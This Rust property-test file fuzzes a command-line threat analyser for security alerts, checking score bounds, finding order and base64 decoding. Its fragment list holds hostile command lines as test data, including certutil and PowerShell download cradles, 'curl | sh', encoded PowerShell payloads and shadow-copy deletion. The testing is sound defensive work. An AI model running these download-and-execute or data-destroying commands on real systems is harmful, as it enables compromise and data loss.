//! Property tests for the command-line analysis (its input is an
//! attacker-controlled alert field).

use base64::engine::general_purpose::STANDARD;
use proptest::prelude::*;

use super::*;

/// `cases` per property, kept small for `cargo test --workspace`; set
/// `PROPTEST_CASES` for a deeper run.
fn config(cases: u32) -> ProptestConfig {
    let default = ProptestConfig::default();
    ProptestConfig {
        cases: if std::env::var_os("PROPTEST_CASES").is_some() {
            default.cases
        } else {
            cases
        },
        failure_persistence: None,
        ..default
    }
}

/// Pieces of real attack command lines, so that the rules, the decoders and
/// the obfuscation heuristics are reached.
const FRAGMENTS: &[&str] = &[
    "powershell.exe",
    "PoWeRsHeLl",
    " -NoP -W Hidden",
    " -EncodedCommand ",
    " -enc ",
    " -e ",
    "cmd.exe /c ",
    "\"C:\\Program Files\\x y\\z.exe\"",
    "C:\\Users\\Public\\",
    "/tmp/",
    "certutil -urlcache -split -f http://198.51.100.7/a.exe",
    "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')",
    "vssadmin delete shadows /all /quiet",
    "rundll32 javascript:",
    "mshta ",
    "bash -c ",
    "curl http://x.example | sh",
    "base64 -d",
    "FromBase64String(",
    "[char]72+[char]0x65",
    "'+'",
    "\"+\"",
    "^",
    "`",
    "%COMSPEC:~0,1%",
    "\"",
    "'",
    " ",
    "\t",
    "\n",
    "=",
    "==",
    "|",
    ";",
    "\\",
    "/",
    "\u{0}",
    "\u{feff}",
    "é",
    "\u{1F600}",
];

/// Base64 of text (UTF-8 or UTF-16LE, optionally nested) or of raw bytes.
fn base64_blob() -> impl Strategy<Value = String> {
    let utf16 = |s: &str| -> Vec<u8> { s.encode_utf16().flat_map(u16::to_le_bytes).collect() };
    prop_oneof![
        prop::collection::vec(any::<u8>(), 0..80).prop_map(|b| STANDARD.encode(b)),
        fragments(4).prop_map(|s| STANDARD.encode(s)),
        fragments(4).prop_map(move |s| STANDARD.encode(utf16(&s))),
        // Two layers: a decoded payload that carries another payload.
        fragments(3).prop_map(move |s| {
            let inner = STANDARD.encode(utf16(&s));
            STANDARD.encode(utf16(&format!("powershell -enc {inner}")))
        }),
        "[A-Za-z0-9+/_-]{0,90}={0,3}",
    ]
}

fn fragments(max: usize) -> impl Strategy<Value = String> {
    prop::collection::vec(prop::sample::select(FRAGMENTS), 0..=max).prop_map(|parts| parts.concat())
}

fn command_line() -> impl Strategy<Value = String> {
    let piece = prop_oneof![
        3 => any::<String>(),
        2 => "[ -~]{0,24}",
        6 => prop::sample::select(FRAGMENTS).prop_map(str::to_string),
        3 => base64_blob(),
    ];
    prop::collection::vec(piece, 0..14).prop_map(|pieces| pieces.concat())
}

fn image() -> impl Strategy<Value = Option<String>> {
    prop::option::of(prop_oneof![
        any::<String>(),
        (
            prop::sample::select(
                &[
                    "C:\\Windows\\System32\\",
                    "C:\\Users\\Public\\",
                    "/usr/bin/",
                    "",
                    "\\\\?\\"
                ][..]
            ),
            prop::sample::select(
                &[
                    "winword.exe",
                    "EXCEL.EXE",
                    "eqnedt32.exe",
                    "cmd.exe",
                    "powershell.exe",
                    "svchost.exe",
                    "scvhost.exe",
                    "lsass.exe",
                    "services.exe",
                    "explorer.exe",
                    "chrome.exe",
                    "wscript.exe",
                    "bash",
                    "",
                ][..]
            ),
        )
            .prop_map(|(dir, exe)| format!("{dir}{exe}")),
    ])
}

/// The invariants every analysis result has, whatever the input.
fn check(a: &CommandLineAnalysis) -> Result<(), TestCaseError> {
    // Score: bounded, the documented noisy-OR of the weights, and the
    // severity is its band.
    prop_assert!(a.score <= 100);
    let remaining: f64 = a
        .findings
        .iter()
        .map(|f| 1.0 - f64::from(f.weight.min(100)) / 100.0)
        .product();
    prop_assert_eq!(a.score, ((1.0 - remaining) * 100.0).round() as u8);
    prop_assert_eq!(a.severity, Severity::from_score(a.score));
    if a.is_clean() {
        prop_assert_eq!(a.score, 0);
    }
    let strongest = a.findings.iter().map(|f| f.weight).max().unwrap_or(0);
    prop_assert!(
        a.score >= strongest.min(100),
        "a finding never lowers the score"
    );

    // Findings: strongest first, one per rule, bounded evidence.
    prop_assert!(a.findings.windows(2).all(|w| w[0].weight >= w[1].weight));
    let mut ids: Vec<&str> = a.findings.iter().map(|f| f.id.as_str()).collect();
    ids.sort_unstable();
    let count = ids.len();
    ids.dedup();
    prop_assert_eq!(ids.len(), count, "duplicate finding id");
    for f in &a.findings {
        prop_assert!(f.weight <= 100);
        prop_assert_eq!(f.severity, severity_of(f.weight));
        prop_assert!(!f.id.is_empty() && !f.title.is_empty());
    }

    // Techniques: the sorted, de-duplicated union of the findings'.
    let union: BTreeSet<String> = a
        .findings
        .iter()
        .flat_map(|f| f.techniques.iter().cloned())
        .collect();
    prop_assert_eq!(&a.techniques, &union.into_iter().collect::<Vec<_>>());

    // Decoded payloads: bounded in number and size.
    prop_assert!(a.decoded.len() <= MAX_PAYLOADS);
    for d in &a.decoded {
        prop_assert!(d.text.chars().count() <= MAX_DECODED_KEEP);
        prop_assert_eq!(
            d.truncated,
            d.text.chars().count() == MAX_DECODED_KEEP && d.text.ends_with('…')
        );
        prop_assert!(d.encoded_length <= MAX_ANALYZED_LEN);
    }

    prop_assert!(a.length <= MAX_ANALYZED_LEN);
    prop_assert!(a.entropy.is_finite() && a.entropy >= 0.0);
    if let Some(exe) = &a.executable {
        prop_assert!(!exe.is_empty());
        prop_assert!(
            !exe.contains(['/', '\\']),
            "executable is a basename: {exe:?}"
        );
        prop_assert!(!exe.chars().any(|c| c.is_ascii_uppercase()));
    }
    // The result always serializes (it is embedded in prompts and reports).
    prop_assert!(serde_json::to_string(a).is_ok());
    Ok(())
}

proptest! {
    #![proptest_config(config(64))]

    /// No command line panics the analysis, and the result is consistent
    /// and deterministic.
    #[test]
    fn analysis_is_total_and_consistent(cmd in command_line()) {
        let a = analyze_command_line(&cmd);
        check(&a)?;
        prop_assert_eq!(a.length, cmd.chars().count());
        prop_assert_eq!(&analyze_command_line(&cmd), &a);
    }

    /// Process context only ever adds findings: the score with context is
    /// never below the score of the command line alone.
    #[test]
    fn process_context_never_lowers_the_score(
        cmd in prop::option::of(command_line()),
        image in image(),
        parent_image in image(),
        parent_cmd in prop::option::of(command_line()),
    ) {
        let ctx = ProcessContext {
            image: image.as_deref(),
            parent_image: parent_image.as_deref(),
            command_line: cmd.as_deref(),
            parent_command_line: parent_cmd.as_deref(),
        };
        let with_context = analyze_process(&ctx);
        check(&with_context)?;
        let alone = analyze_command_line(cmd.as_deref().unwrap_or(""));
        prop_assert!(with_context.score >= alone.score);
        for f in &alone.findings {
            prop_assert!(
                with_context.findings.iter().any(|g| g.id == f.id && g.weight >= f.weight),
                "finding {} lost with process context",
                f.id
            );
        }
    }

    /// The helpers are total; decoded text is printable text.
    #[test]
    fn helpers_never_panic(text in command_line(), blob in base64_blob()) {
        let entropy = shannon_entropy(&text);
        prop_assert!(entropy.is_finite() && entropy >= 0.0);
        // At most log2(number of distinct characters).
        let distinct = text.chars().collect::<BTreeSet<_>>().len().max(1);
        prop_assert!(entropy <= (distinct as f64).log2() + 1e-9);
        let _ = command_executable(&text);
        for input in [&text, &blob] {
            if let Some(decoded) = decode_base64_text(input) {
                prop_assert!(mostly_printable(&decoded));
            }
        }
    }
}

proptest! {
    // Each case analyses 256 KiB: a fixed, small number of cases.
    #![proptest_config(ProptestConfig {
        cases: 8,
        failure_persistence: None,
        ..ProptestConfig::default()
    })]

    /// Input beyond `MAX_ANALYZED_LEN` is clipped (on a character
    /// boundary), not processed.
    #[test]
    fn oversized_input_is_clipped(
        unit in prop_oneof![Just("A"), Just("é"), Just("\u{1F600}"), Just("x "), Just("QUJD")],
        tail in command_line(),
    ) {
        let cmd = format!("{}{tail}", unit.repeat(MAX_ANALYZED_LEN / unit.len() + 3));
        let a = analyze_command_line(&cmd);
        check(&a)?;
        prop_assert!(a.length <= MAX_ANALYZED_LEN);
        prop_assert!(a.length >= MAX_ANALYZED_LEN / 4 - 1);
    }
}

/// Regression (found by `process_context_never_lowers_the_score`): an empty
/// image, or one that ends in a path separator, was reported as
/// `executable: Some("")` when there was no command line to take it from.
#[test]
fn empty_image_names_no_executable() {
    for image in ["", "  ", "C:\\Windows\\System32\\", "/usr/bin/", "\"\""] {
        let a = analyze_process(&ProcessContext {
            image: Some(image),
            ..ProcessContext::default()
        });
        assert_eq!(a.executable, None, "{image:?}");
    }
    let a = analyze_process(&ProcessContext {
        image: Some("C:\\Windows\\System32\\CMD.EXE"),
        ..ProcessContext::default()
    });
    assert_eq!(a.executable.as_deref(), Some("cmd.exe"));
}
